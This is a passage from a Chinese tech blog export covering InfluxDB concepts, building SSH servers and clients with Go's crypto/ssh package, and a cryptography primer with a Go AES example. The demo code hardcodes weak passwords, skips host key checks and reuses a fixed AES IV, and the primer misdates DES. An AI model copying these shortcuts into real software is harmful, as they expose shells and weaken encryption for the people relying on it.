measurement+所有tags的序列化字符串, 他保存着该series的Retention policy, Measurement,Tag set, 比如:123456|--------------------------------------------------------------------------------------------------||Arbitrary series number | Retention policy | Measurement | Tag set ||series 1 | autogen | census | location = 1,scientist = langstroth ||series 2 | autogen | census | location = 2,scientist = langstroth ||series 3 | autogen | census | location = 1,scientist = perpetua ||--------------------------------------------------------------------------------------------------| PointInfluxDB中单条插入语句的数据结构体, 用于保存点位的值的集合, 每一个Point通过series和timestamp进行唯一标示:1234name: census-----------------time butterflies honeybees location scientist2015-08-18T00:00:00Z 1 30 1 perpetua Schema用于描述数据在InfluxDB的组织形式, InfluxDB的Schema十分简单由 这些概念组成: databases retention policies series measurements tag keys tag values field keys在操作数据库的时候，需要知道这些概念。 Continuous Query简称CQ, 是预先配置好的一些查询命令，SELECT语句必须包含GROUP BY time()，influxdb会定期自动执行这些命令并将查询结果写入指定的另外的measurement中。利用这个特性并结合RP我们可以方便地保存不同粒度的数据，根据数据粒度的不同设置不同的保存时间，这样不仅节约了存储空间，而且加速了时间间隔较长的数据查询效率，避免查询时再进行聚合计算。 存储引擎从LevelDB(LSM Tree)，到BoltD(mmap B+树)，现在是自己实现的TSM Tree的算法，类似LSM Tree，针对InfluxDB的使用做了特殊优化。 ShardShard这个概念并不对普通用户开放，Shard也不是存储引擎, 它在存储引擎之上的一个概念, 存储引擎负责存储shard, 因此在讲存储引擎之前先讲明shard。 在InfluxDB中按照数据的时间戳所在的范围，会去创建不同的shard，每一个shard都有自己的存储引擎相关文件，这样做的目的就是为了可以通过时间来快速定位到要查询数据的相关资源，加速查询的过程，并且也让之后的批量删除数据的操作变得非常简单且高效。 它和retention policy相关联。每一个存储策略下会存在许多shard，每一个shard存储一个指定时间段内的数据，并且不重复，例如7点-8点的数据落入shard0 中，8点-9点的数据则落入shard1中。每一个shard都对应一个底层的存储引擎。 当检测到一个shard中的数据过期后，只需要将这个shard的资源释放，相关文件删除即可，这样的做法使得删除过期数据变得非常高效。 LevelDBBoltDBTSM Tree功能使用安装与部署我这里主要做功能测试, 后面会有机会专门做性能测试, 因此这里使用官方提供的docker镜像部署,官方镜像最新也是1.2版本配置Daocloud的镜像加速源或者阿里的加速源,然后直接拉取镜像1docker pull influxdb 由于influxDB开发时就设计好了, 官方也给出了环境配置变量,启动时可以通过这些环境变量对influxdb进行配置InfluxDB配置 函数与SQL内部提供很多函数,方便一些基本操作InfluxQL Functions123456789101112131415161718192021222324252627282930&gt; SELECT MEAN("water_level") FROM "h2o_feet" WHERE "location"='coyote_creek' AND time &gt;= '2015-08-18T00:06:00Z' AND time &lt;= '2015-08-18T00:54:00Z' GROUP BY time(18m)name: h2o_feettime mean---- ----2015-08-18T00:00:00Z 7.9462015-08-18T00:18:00Z 7.63233333333333252015-08-18T00:36:00Z 7.2386666666666672015-08-18T00:54:00Z 6.982&gt; SELECT MAX("water_level") FROM "h2o_feet" WHERE time &gt;= '2015-08-18T00:00:00Z' AND time &lt; '2015-08-18T00:54:00Z' GROUP BY time(12m), "location"name: h2o_feettags: location = coyote_creektime max---- ---2015-08-18T00:00:00Z 8.122015-08-18T00:12:00Z 7.8872015-08-18T00:24:00Z 7.6352015-08-18T00:36:00Z 7.3722015-08-18T00:48:00Z 7.11name: h2o_feettags: location = santa_monicatime max---- ---2015-08-18T00:00:00Z 2.1162015-08-18T00:12:00Z 2.1262015-08-18T00:24:00Z 2.0512015-08-18T00:36:00Z 2.0672015-08-18T00:48:00Z 1.991 用户认证和权限Retention PolicyCotinuous Query常见操作(SQL)性能建议官方有很详解的说明,我这里仅截取出单节点部分:官方推荐硬件配置 Load Field writes per second MOderate queries per second Unique series Low &lt; 5 thousand &lt; 5 &lt; 100 thousand Moderate &lt; 250 thousand &lt; 25 &lt; 1 million High &gt; 250 &gt; 25 &gt; 1 million Probobly infeasible &gt; 750 thousand &gt; 100 &gt; 10 million 根据负载情况官方推荐的硬件需求: Load CPU RAM IOPS Low 2-4 cores 2-4 G 500 Moderate 4-6 cores 8-32 G 500-1000 High 8 cores 32+ G 1000+]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[跳板机系列(四)-Golang中SSH服务端的实现]]></title>
      <url>%2F2017%2F02%2F23%2Fgo-ssh-server%2F</url>
      <content type="text"><![CDATA[上篇博客介绍了如何亲手实现一个SSH的客户端, 这篇博客将介绍如何使用golang的SSH包构建一个自己的SSH Server, 这样我们基本就能比较全面的了解的SSH的实现。为我们编写一个SSH Proxy奠定基石。 简介 以上是SSH协议一个基本架构图, 关于SSH协议的简介可以参考跳板机系列(二)-ssh协议原理简介, 只有在了解了SSH协议相关的基础上,才能理解SSH包里面的参数。对照着SSH协议, 将上面的架构图做简要解读: TCP: 建立传输层链接, 然后进行SSH协议处理 Handshake: 建立SSH协议里面的传输层[SSH-TRANS,该层主要提供加密传输 Authentication: SSH协议里面的用户认证层[SSH-USERAUTH], 提供用户认证 Channel和Request: 这些都是SSH协议里面的链接层[SSH-CONNECT], 该层主要是将多个加密隧道分成逻辑通道, 可以复用通道,通道有比较多的类型：session、x11、forwarded-tcpip、direct-tcpip, 通道里面的Requests是用于接收创建ssh channle的请求的, 而ssh channle就是里面的connection, 数据的交互基于connection交互。 Server配置 首先, 我们需要创建一个SSH Server的配置, 这里主要是配置认证, 作为一个SSH Server默认是应该支持2认证: 密钥认证和密码认证, 为了方便我仅实现密码认证。实现密码认证的核心是实现Server Config对象里面的PasswordCallback的函数, 该函数的核心是返回一个ssh.Permissions对象, 该对象保持了User认证通过的信息。这里为了方便, 并没有将认证系统和PAM对接, 而是直接简单的实现了一个用户名密码比较。这也是很核心的一个点, 基于此 我们在设计跳板机的时候, 可以实现Server端的统一认证, 在这里插入统一认证的代码。 12345678config := &amp;ssh.ServerConfig&#123; PasswordCallback: func(c ssh.ConnMetadata, pass []byte) (*ssh.Permissions, error) &#123; if c.User() == "root" &amp;&amp; string(pass) == "admin" &#123; return nil, nil &#125; return nil, fmt.Errorf("password rejected for %q", c.User()) &#125;,&#125; 其次, 我们需要配置SSH Server的私钥, 需要保证私钥的安全, 因为他用于进行秘钥交换算法的关键(DH)1234567891011privateBytes, err := ioutil.ReadFile("id_rsa")if err != nil &#123; log.Fatal("Failed to load private key (./id_rsa)")&#125;private, err := ssh.ParsePrivateKey(privateBytes)if err != nil &#123; log.Fatal("Failed to parse private key")&#125;config.AddHostKey(private) 建立SSH通道(SSH链接层) SSH Server配置完成后, 首先得建立TCP链接123456789101112listener, err := net.Listen("tcp", "0.0.0.0:2200")if err != nil &#123; log.Fatalf("Failed to listen on 2200 (%s)", err)&#125;log.Print("Listening on 2200...")for &#123; conn, err := listener.Accept() if err != nil &#123; log.Printf("Failed to accept incoming connection (%s)", err) continue &#125; 然后我们通过ssh.NewServerConn来升级TCP链接为SSH链接, ssh提供的这个函数根据之前的配置完成: 1. 传输层[SSH-TRANS] 2. 认证层[SSH-USERAUTH] 3. 返回链接层的通道: incomingChannels, 接下来我们需要在Goroutine里面处理这些用户的通道。1234567891011 sshConn, chans, reqs, err := ssh.NewServerConn(conn, config) if err != nil &#123; log.Printf("Failed to handshake (%s)", err) continue &#125; // Discard all global out-of-band Requests go ssh.DiscardRequests(reqs) // Accept all channels go handleChannels(chans)&#125; 这样我们就已经完成了SSH Server的连接的监听 为了不阻塞通道的处理, 我们将每一个通道的处理都放到Goroutine里面进行12345func handleChannels(chans &lt;-chan ssh.NewChannel) &#123; for newChannel := range chans &#123; go handleChannel(newChannel) &#125;&#125; 在处理ssh channel里面的数据之前, 我们需要知道channel的类型, 因为不同类型的channel里面是不同类型的数据, 处理逻辑也不一样具体见rfc4250的4.9.1, 里面有比较详解的解释, 我们先不实现其他的,仅实现处理session类型channel。上面提到了通道有4种类型, 每种类型都有不同的用途,这里我们仅实现session类型通道的处理。123456func handleChannel(newChannel ssh.NewChannel) &#123; if t := newChannel.ChannelType(); t != "session" &#123; newChannel.Reject(ssh.UnknownChannelType, "unknown channel type") return &#125;&#125; 建立SSH Channel(回话交互) 通道提供一个Accept方法, 该方法返回2个queue, 1个用于数据交换(架构图里面的connection), 1个用于控制指令的交互,比如创建connection queue(架构图里面的requests)12345connection, requests, err := newChannel.Accept()if err != nil &#123; log.Printf("Could not accept channel (%s)", err) return&#125; 数据交互我们将运行bash程序,然后bash与 ssh channel对接, 从而实现和bash的远程交互, 从这里可以看出, 其实这里可以扩展性很高, 我们如果运行其他服务比如git,那么git也可通过ssh链接来交互。 git也正是通过这种方式支持ssh的。这里准备了一个colse函数用于关闭ssh channel和退出bash程序1234567891011bash := exec.Command("bash")// Prepare teardown functionclose := func() &#123; _, err := bash.Process.Wait() if err != nil &#123; log.Printf("Failed to exit bash (%s)", err) &#125; connection.Close() log.Printf("Session closed")&#125; 如果我们直接将bash的输入和输出流行terminal这将失败, 因为bash没有运行在tty中, 因此这里需要一个模拟tty(pty)来运行bash。123456bashf, err := pty.Start(bash)if err != nil &#123; log.Printf("Could not start pty (%s)", err) close() return&#125; 接下来我们需要将 bash的管道和connection的管道对接起来, 这里为了保证colse函数(connection资源释放)只被调用一次使用的sync.Once。123456789var once sync.Oncego func() &#123; io.Copy(connection, bashf) once.Do(close)&#125;()go func() &#123; io.Copy(bashf, connection) once.Do(close)&#125;() 指令交互这里主要有以下几类请求: shell/exec/subsystem: channel request type for shell, 这几类主要是用于区分connection链接的程序, shell值后面启动的一个程序或者shell, exec指后面启动的是用户的默认shell, 而subsystem是在后面启动一个子程序来执行connection里面的命令 pty-req: 准备一个pty等待输入 window-change: 监听tty窗口改变事件。及时更新tty size。123456789101112131415161718192021 go func() &#123; for req := range requests &#123; switch req.Type &#123; case "shell": // We only accept the default shell // (i.e. no command in the Payload) if len(req.Payload) == 0 &#123; req.Reply(true, nil) &#125; case "pty-req": termLen := req.Payload[3] w, h := parseDims(req.Payload[termLen+4:]) SetWinsize(bashf.Fd(), w, h) req.Reply(true, nil) case "window-change": w, h := parseDims(req.Payload) SetWinsize(bashf.Fd(), w, h) &#125; &#125; &#125;()&#125; 完整代码以下是完整代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184package mainimport ( "encoding/binary" "fmt" "io" "io/ioutil" "log" "net" "os/exec" "sync" "syscall" "unsafe" "github.com/kr/pty" "golang.org/x/crypto/ssh")func main() &#123; // In the latest version of crypto/ssh (after Go 1.3), the SSH server type has been removed // in favour of an SSH connection type. A ssh.ServerConn is created by passing an existing // net.Conn and a ssh.ServerConfig to ssh.NewServerConn, in effect, upgrading the net.Conn // into an ssh.ServerConn config := &amp;ssh.ServerConfig&#123; //Define a function to run when a client attempts a password login PasswordCallback: func(c ssh.ConnMetadata, pass []byte) (*ssh.Permissions, error) &#123; // Should use constant-time compare (or better, salt+hash) in a production setting. if c.User() == "foo" &amp;&amp; string(pass) == "bar" &#123; return nil, nil &#125; return nil, fmt.Errorf("password rejected for %q", c.User()) &#125;, // You may also explicitly allow anonymous client authentication, though anon bash // sessions may not be a wise idea // NoClientAuth: true, &#125; // You can generate a keypair with 'ssh-keygen -t rsa' privateBytes, err := ioutil.ReadFile("id_rsa") if err != nil &#123; log.Fatal("Failed to load private key (./id_rsa)") &#125; private, err := ssh.ParsePrivateKey(privateBytes) if err != nil &#123; log.Fatal("Failed to parse private key") &#125; config.AddHostKey(private) // Once a ServerConfig has been configured, connections can be accepted. listener, err := net.Listen("tcp", "0.0.0.0:2200") if err != nil &#123; log.Fatalf("Failed to listen on 2200 (%s)", err) &#125; // Accept all connections log.Print("Listening on 2200...") for &#123; tcpConn, err := listener.Accept() if err != nil &#123; log.Printf("Failed to accept incoming connection (%s)", err) continue &#125; // Before use, a handshake must be performed on the incoming net.Conn. sshConn, chans, reqs, err := ssh.NewServerConn(tcpConn, config) if err != nil &#123; log.Printf("Failed to handshake (%s)", err) continue &#125; log.Printf("New SSH connection from %s (%s)", sshConn.RemoteAddr(), sshConn.ClientVersion()) // Discard all global out-of-band Requests go ssh.DiscardRequests(reqs) // Accept all channels go handleChannels(chans) &#125;&#125;func handleChannels(chans &lt;-chan ssh.NewChannel) &#123; // Service the incoming Channel channel in go routine for newChannel := range chans &#123; go handleChannel(newChannel) &#125;&#125;func handleChannel(newChannel ssh.NewChannel) &#123; // Since we're handling a shell, we expect a // channel type of "session". The also describes // "x11", "direct-tcpip" and "forwarded-tcpip" // channel types. if t := newChannel.ChannelType(); t != "session" &#123; newChannel.Reject(ssh.UnknownChannelType, fmt.Sprintf("unknown channel type: %s", t)) return &#125; // At this point, we have the opportunity to reject the client's // request for another logical connection connection, requests, err := newChannel.Accept() if err != nil &#123; log.Printf("Could not accept channel (%s)", err) return &#125; // Fire up bash for this session bash := exec.Command("bash") // Prepare teardown function close := func() &#123; connection.Close() _, err := bash.Process.Wait() if err != nil &#123; log.Printf("Failed to exit bash (%s)", err) &#125; log.Printf("Session closed") &#125; // Allocate a terminal for this channel log.Print("Creating pty...") bashf, err := pty.Start(bash) if err != nil &#123; log.Printf("Could not start pty (%s)", err) close() return &#125; //pipe session to bash and visa-versa var once sync.Once go func() &#123; io.Copy(connection, bashf) once.Do(close) &#125;() go func() &#123; io.Copy(bashf, connection) once.Do(close) &#125;() // Sessions have out-of-band requests such as "shell", "pty-req" and "env" go func() &#123; for req := range requests &#123; switch req.Type &#123; case "shell": // We only accept the default shell // (i.e. no command in the Payload) if len(req.Payload) == 0 &#123; req.Reply(true, nil) &#125; case "pty-req": termLen := req.Payload[3] w, h := parseDims(req.Payload[termLen+4:]) SetWinsize(bashf.Fd(), w, h) // Responding true (OK) here will let the client // know we have a pty ready for input req.Reply(true, nil) case "window-change": w, h := parseDims(req.Payload) SetWinsize(bashf.Fd(), w, h) &#125; &#125; &#125;()&#125;// parseDims extracts terminal dimensions (width x height) from the provided buffer.func parseDims(b []byte) (uint32, uint32) &#123; w := binary.BigEndian.Uint32(b) h := binary.BigEndian.Uint32(b[4:]) return w, h&#125;// Winsize stores the Height and Width of a terminal.type Winsize struct &#123; Height uint16 Width uint16 x uint16 // unused y uint16 // unused&#125;// SetWinsize sets the size of the given pty.func SetWinsize(fd uintptr, w, h uint32) &#123; ws := &amp;Winsize&#123;Width: uint16(w), Height: uint16(h)&#125; syscall.Syscall(syscall.SYS_IOCTL, fd, uintptr(syscall.TIOCSWINSZ), uintptr(unsafe.Pointer(ws)))&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[跳板机系列(三)-Golang中SSH客户端的实现]]></title>
      <url>%2F2017%2F02%2F22%2Fssh-protocol-go%2F</url>
      <content type="text"><![CDATA[上面几篇博客已经介绍过加密算法和ssh协议的构成, 这篇博客主要将介绍golang中ssh库的一些具体使用,为后面写ssh的跳板机做铺垫。 栗子先上2个栗子, 后面会对此做详细介绍Shell交互模式1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253 package mainimport ( "log" "os" "golang.org/x/crypto/ssh" "golang.org/x/crypto/ssh/terminal")func main() &#123; ce := func(err error, msg string) &#123; if err != nil &#123; log.Fatalf("%s error: %v", msg, err) &#125; &#125; client, err := ssh.Dial("tcp", "localhost:1234", &amp;ssh.ClientConfig&#123; User: "root", Auth: []ssh.AuthMethod&#123;ssh.Password("xxx")&#125;, &#125;) ce(err, "dial") session, err := client.NewSession() ce(err, "new session") defer session.Close() session.Stdout = os.Stdout session.Stderr = os.Stderr session.Stdin = os.Stdin modes := ssh.TerminalModes&#123; ssh.ECHO: 1, ssh.ECHOCTL: 0, ssh.TTY_OP_ISPEED: 14400, ssh.TTY_OP_OSPEED: 14400, &#125; termFD := int(os.Stdin.Fd()) w, h, _ := terminal.GetSize(termFD) termState, _ := terminal.MakeRaw(termFD) defer terminal.Restore(termFD, termState) err = session.RequestPty("xterm-256color", h, w, modes) ce(err, "request pty") err = session.Shell() ce(err, "start shell") err = session.Wait() ce(err, "return")&#125; 远程命令模式123456789101112131415161718192021222324252627282930313233343536373839404142434445464748package mainimport ( "bytes" "fmt" "log" "golang.org/x/crypto/ssh")func main() &#123; ce := func(err error, msg string) &#123; if err != nil &#123; log.Fatalf("%s error: %v", msg, err) &#125; &#125; client, err := ssh.Dial("tcp", "localhost:1234", &amp;ssh.ClientConfig&#123; User: "root", Auth: []ssh.AuthMethod&#123;ssh.Password("xxx")&#125;, &#125;) ce(err, "dial") session, err := client.NewSession() ce(err, "new session") defer session.Close() modes := ssh.TerminalModes&#123; ssh.ECHO: 1, ssh.ECHOCTL: 0, ssh.TTY_OP_ISPEED: 14400, ssh.TTY_OP_OSPEED: 14400, &#125; err = session.RequestPty("xterm-256color", 80, 40, modes) ce(err, "request pty") if err := session.Setenv("LC_USR_DIR", "/usr"); err != nil &#123; panic("Failed to run: " + err.Error()) &#125; var b bytes.Buffer session.Stdout, session.Stderr = &amp;b, &amp;b if err := session.Run("ls -l $LC_USR_DIR"); err != nil &#123; panic("Failed to run: " + err.Error()) &#125; fmt.Println(b.String())&#125; 简介SSH(Secure Shell)是一个提供数据通信安全、远程登录、远程指令执行等功能的安全网络协议, 具体可以查阅我的上一篇博客跳板机系列(二)-ssh协议原理简介但是golang的ssh包并不在golang的标准库中, 在: godoc.org/golang.org/x/crypto/ssh中, 所以需要翻墙才能下到。golang的这个ssh包同时实现了ssh的客户端和server端, 也许你也经常看到一个ssh-agent的东西, 也在这个包括, 但我不将他归纳在client和server里面, 因为ssh-agent是一个用于保存私钥的程序, 在数字签名验证时(RSA, DSA, ECDSA, Ed25519)提供身份认证, 它就是一个帮助我们验证身份的程序。接下来主要讲ssh clent, 但是还是会涉及到一点ssh-agent的部分。 认证要使用ssh的客户端, 那么认证就比较关键了, ssh提供2种认证方式: 用户名密码认证和密钥认证。通过ssh提供的一个config对象, 我们可以配置ssh使用的认证方式. 而配置对象里面关于认证的配置使用的是ssh.AuthMethod接口, ssh.AuthMethod是auth的总接口(存储实现了auth 和 method的对象), AuthMethod呈现的是一个实现了RFC4252认证方法的实例。 用户名密码认证认证方式如果使用Password方式的话 那么可以使用ssh.Password方法获取一个AuthMethod接口对象。123456sshConfig := &amp;ssh.ClientConfig&#123; User: "your_user_name", Auth: []ssh.AuthMethod&#123; ssh.Password("your_password") &#125;,&#125; 密钥认证前提: 密钥认证的本质是使用非对称加密的数字签名功能, 所以必须将你的公共密钥填充到一个远程机器上的authorized_keys文件中 你可以手动完成, 也可以使用ssh-copy-id这个命令来帮你完成。在公钥推送ok过后, 使用秘钥认证, 这里有两种方式可以获取用户的私钥, 用于签名算法时做身份认证: 从秘钥文件中读取和ssh-agent中读取。 私钥文件读取私钥文件, 然后使用ssh.PublicKeys方法 获取一个AuthMethod接口对象, 这里我再次封装了下, 通过PublicKeyFile可以直接获取一个公钥的AuthMethod接口。12345678910111213141516171819func PublicKeyFile(file string) ssh.AuthMethod &#123; buffer, err := ioutil.ReadFile(file) if err != nil &#123; return nil &#125; key, err := ssh.ParsePrivateKey(buffer) if err != nil &#123; return nil &#125; return ssh.PublicKeys(key)&#125;sshConfig := &amp;ssh.ClientConfig&#123; User: "your_user_name", Auth: []ssh.AuthMethod&#123; PublicKeyFile("/path/to/your/pub/certificate/key") &#125;,&#125; SSH AgentSSH Agent 是一个*nix系统里面的工具, 他将用户私钥保存在一张加密的表中, 为了避免命令行的参数传入, 很多用户还是愿意将他们的秘钥交给ssh agent管理。为了能获取到你存储在ssh agent中的私钥, 你首先的将你的私钥提交给ssh agent保管,执行如下命令:1$ ssh-add /path/to/your/private/certificate/file 我们可以通过socket(net.Dial)访问到里面存储的私钥, 然后使用工厂函数ssh.PublicKeysCallback来创建一个ssh agent的AuthMethod实例。12345678910111213func SSHAgent() ssh.AuthMethod &#123; if sshAgent, err := net.Dial("unix", os.Getenv("SSH_AUTH_SOCK")); err == nil &#123; return ssh.PublicKeysCallback(agent.NewClient(sshAgent).Signers) &#125; return nil&#125;sshConfig := &amp;ssh.ClientConfig&#123; User: "your_user_name", Auth: []ssh.AuthMethod&#123; SSHAgent() &#125;,&#125; 建立链接当我们通过ssh.ClientConfig对象设置好ssh的配置过后, 我们就可以调用ssh.Dial方法来建立一个ssh连接了1234connection, err := ssh.Dial("tcp", "host:port", sshConfig)if err != nil &#123; return nil, fmt.Errorf("Failed to dial: %s", err)&#125; 创建回话与交换当ssh连接建立过后, 我们就可以通过这个连接建立一个回话, 在回话上和远程主机通信。1234session, err := connection.NewSession()if err != nil &#123; return nil, fmt.Errorf("Failed to create session: %s", err)&#125; 但是通信之前我们需要请求在远程主机上创建一个伪终端(pty全称pseudo terminal), 简单说来pty是一对字符设备, 提供一个双向沟通的渠道，大概过程是这样(pty master &lt;—session—&gt; pty slave), 关于对pty的更详尽的介绍可以参考TTY的那些事儿12345678910modes := ssh.TerminalModes&#123; ssh.ECHO: 0, // disable echoing ssh.TTY_OP_ISPEED: 14400, // input speed = 14.4kbaud ssh.TTY_OP_OSPEED: 14400, // output speed = 14.4kbaud&#125;if err := session.RequestPty("xterm", 80, 40, modes); err != nil &#123; session.Close() return nil, fmt.Errorf("request for pseudo terminal failed: %s", err)&#125; 远程主机开启pty终端过后, 我们就可以直接通过Run发送命令了, 这里我们通过Setenv设置session的环境变量, session执行的结果通过Stdout, Stderr返回, 这里使用一个Buffer来保存这些结果。123456789if err := session.Setenv("LC_USR_DIR", "/usr"); err != nil &#123; panic("Failed to run: " + err.Error())&#125;var b bytes.Buffersession.Stdout, session.Stderr = &amp;b, &amp;bif err := session.Run("ls -l $LC_USR_DIR"); err != nil &#123; panic("Failed to run: " + err.Error())&#125; 如果我们使用Shell模式的话, 我们需要在ptmx上创建一个terminal, 这样对他的操作才会反应到pts上 ,大概的原理是这样: ssh&lt;---&gt;/dev/ptmx(master)&lt;---&gt;pts/*(slave)&lt;---&gt;getty为了说清楚原理, 我引用了别人的话,希望能方便你理解: 如果某人在网上使用telnet程序连接到你的计算机上，则telnet程序就可能会打开/dev/ptmx设备获取一个fd。此时一个getty程序就应该运行在对应的/dev/pts/上。当telnet从远端获取了一个字符时，该字符就会通过ptmx、pts/传递给 getty程序，而getty程序就会通过pts/*、ptmx和telnet程序往网络上返回“login:”字符串信息。这样，登录程序与telnet程序就通过伪终端进行通信。 123456789101112131415161718session.Stdout = os.Stdoutsession.Stderr = os.Stderrsession.Stdin = os.Stdinmodes := ssh.TerminalModes&#123; ssh.ECHO: 1, ssh.ECHOCTL: 0, ssh.TTY_OP_ISPEED: 14400, ssh.TTY_OP_OSPEED: 14400,&#125;termFD := int(os.Stdin.Fd())w, h, _ := terminal.GetSize(termFD)termState, _ := terminal.MakeRaw(termFD)defer terminal.Restore(termFD, termState)err = session.RequestPty("xterm-256color", h, w, modes)ce(err, "request pty") 总结其实TTY是一个很大很经典的话题, 后面做Web Terminal时, 还得使用xterm这种类型的pty, 由于篇幅有限, 没有展开, 以后补上。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[密码学简介与Golang的加密库Crypto的使用]]></title>
      <url>%2F2017%2F02%2F19%2Fgo-crypto%2F</url>
      <content type="text"><![CDATA[据记载，公元前400年，古希腊人发明了置换密码。1881年世界上的第一个电话保密专利出现。在第二次世界大战期间，德国军方启用“恩尼格玛”密码机，密码学在战争中起着非常重要的作用, 这段历史很有趣,建议看看恩格玛机破解历史。随着信息化和数字化社会的发展，人们对信息安全和保密的重要性认识不断提高，于是在1997年，美国国家标准局公布实施了“美国数据加密标准（DES）”，民间力量开始全面介入密码学的研究和应用中，采用的加密算法有DES、RSA、SHA等。随着对加密强度需求的不断提高，近期又出现了AES、ECC等。 密码学的目的 保密性：防止用户的标识或数据被读取。 数据完整性：防止数据被更改。 身份验证：确保数据发自特定的一方。 密码学的应用随着密码学商业应用的普及，公钥密码学受到前所未有的重视。除传统的密码应用系统外，PKI系统以公钥密码技术为主，提供加密、签名、认证、密钥管理、分配等功能。 保密通信：保密通信是密码学产生的动因。使用公私钥密码体制进行保密通信时，信息接收者只有知道对应的密钥才可以解密该信息。 数字签名：数字签名技术可以代替传统的手写签名，而且从安全的角度考虑，数字签名具有很好的防伪造功能。在政府机关、军事领域、商业领域有广泛的应用环境。 秘密共享：秘密共享技术是指将一个秘密信息利用密码技术分拆成n个称为共享因子的信息，分发给n个成员，只有k(k≤n)个合法成员的共享因子才可以恢复该秘密信息，其中任何一个或m(m≤k)个成员合作都不知道该秘密信息。利用秘密共享技术可以控制任何需要多个人共同控制的秘密信息、命令等。 认证功能：在公开的信道上进行敏感信息的传输，采用签名技术实现对消息的真实性、完整性进行验证，通过验证公钥证书实现对通信主体的身份验证。 密钥管理：密钥是保密系统中更为脆弱而重要的环节，公钥密码体制是解决密钥管理工作的有力工具；利用公钥密码体制进行密钥协商和产生，保密通信双方不需要事先共享秘密信息；利用公钥密码体制进行密钥分发、保护、密钥托管、密钥恢复等。 加密算法介绍根据密钥类型不同将现代密码技术分为两类： 对称加密算法: 加密和解密均采用同一把秘密钥匙。 非对称加密算法: 有2把密钥,公钥和私钥, 公钥加密, 私钥解密。 对称加密算法对称加密算法用来对敏感数据等信息进行加密，常用的算法包括： DES(Data Encryption Standard): 数据加密标准，速度较快，适用于加密大量数据的场合。 3DES(Triple DES): 是基于DES，对一块数据用三个不同的密钥进行三次加密，强度更高。 AES(Advanced Encryption Standard): 高级加密标准，是下一代的加密算法标准，速度快，安全级别高； AES2000年10月，NIST(美国国家标准和技术协会)宣布通过从15种侯选算法中选出的一项新的密匙加密标准。Rijndael被选中成为将来的AES。 Rijndael是在1999年下半年，由研究员Joan Daemen和Vincent Rijmen创建的。AES正日益成为加密各种形式的电子数据的实际标准。并于2002年5月26日制定了新的高级加密标准 (AES) 规范。算法原理 AES算法基于排列和置换运算。排列是对数据重新进行安排，置换是将一个数据单元替换为另一个。AES 使用几种不同的方法来执行排列和置换运算。AES是一个迭代的、对称密钥分组的密码，它可以使用128、192 和 256 位密钥，并且用 128 位（16字节）分组加密和解密数据。与公共密钥密码使用密钥对不同，对称密钥密码使用相同的密钥加密和解密数据。通过分组密码返回的加密数据的位数与输入数据相同。迭代加密使用一个循环结构，在该循环中重复置换和替换输入数据。 DESDES全称为Data Encryption Standard，即数据加密标准，是一种使用密钥加密的块算法，1977年被美国联邦政府的国家标准局确定为联邦资料处理标准（FIPS），并授权在非密级政府通信中使用，随后该算法在国际上广泛流传开来。 AES与3DES的比较 算法名称 算法类型 密钥长度 速度 解密时间（建设机器每秒尝试255个密钥） 资源消耗 AES 对称block密码 128、192、256位 高 1490000亿年 低 3DES 对称feistel密码 112位或168位 低 46亿年 中 破解历史历史上有三次对DES有影响的攻击实验。1997年，利用当时各国 7万台计算机，历时96天破解了DES的密钥。1998年，电子边境基金会（EFF）用25万美元制造的专用计算机，用56小时破解了DES的密钥。1999年，EFF用22小时15分完成了破解工作。因此。曾经有过卓越贡献的DES也不能满足我们日益增长的需求了。 代码示例综上看来AES安全度最高, 基本现状就是AES已经替代DES成为新一代对称加密的标准, 下面是Golang中AES使用的栗子12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364package mainimport ( "crypto/aes" "crypto/cipher" "fmt")var commonIV = []byte&#123;0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f&#125;func encrypt(plainText string, keyText string) (cipherByte []byte, err error) &#123; // 转换成字节数据, 方便加密 plainByte := []byte(plainText) keyByte := []byte(keyText) // 创建加密算法aes c, err := aes.NewCipher(keyByte) if err != nil &#123; return nil, err &#125; //加密字符串 cfb := cipher.NewCFBEncrypter(c, commonIV) cipherByte = make([]byte, len(plainByte)) cfb.XORKeyStream(cipherByte, plainByte) return&#125;func decrypt(cipherByte []byte, keyText string) (plainText string, err error) &#123; // 转换成字节数据, 方便加密 keyByte := []byte(keyText) // 创建加密算法aes c, err := aes.NewCipher(keyByte) if err != nil &#123; return "", err &#125; // 解密字符串 cfbdec := cipher.NewCFBDecrypter(c, commonIV) plainByte := make([]byte, len(cipherByte)) cfbdec.XORKeyStream(plainByte, cipherByte) plainText = string(plainByte) return&#125;func main() &#123; plain := "The text need to be encrypt." // AES 规定有3种长度的key: 16, 24, 32分别对应AES-128, AES-192, or AES-256 key := "abcdefgehjhijkmlkjjwwoew" // 加密 cipherByte, err := encrypt(plain, key) if err != nil &#123; fmt.Println(err) &#125; fmt.Printf("%s ==&gt; %x\n", plain, cipherByte) // 解密 plainText, err := decrypt(cipherByte, key) if err != nil &#123; fmt.Println(err) &#125; fmt.Printf("%x ==&gt; %s\n", cipherByte, plainText)&#125; 非对称算法非对称加密算法常用于数据加密和身份认证, 常见的非对称加密算法如下： RSA: 由RSA公司发明，是一个支持变长密钥的公共密钥算法，需要加密的文件块的长度也是可变的； DSA(Digital Signature Algorithm): 数字签名算法，是一种标准的DSS(数字签名标准)； ECC(Elliptic Curves Cryptography): 椭圆曲线密码编码学。 ECDSA(Elliptic Curve Digital Signature Algorithm): 基于椭圆曲线的DSA签名算法 DSADSA是基于整数有限域离散对数难题的，其安全性与RSA相比差不多。DSA的一个重要特点是两个素数公开，这样，当使用别人的p和q时，即使不知道私钥，你也能确认它们是否是随机产生的，还是作了手脚。RSA算法却做不到但是其缺点就是只能用于数字签名, 不能用于加密。 RSA在1976年，由于对称加密算法已经不能满足需要，Diffie 和Hellman发表了一篇叫《密码学新动向》的文章，介绍了公匙加密的概念，由Rivet、Shamir、Adelman提出了RSA算法。RSA是目前最有影响力的公钥加密算法，它能够抵抗到目前为止已知的绝大多数密码攻击，已被ISO推荐为公钥数据加密标准。 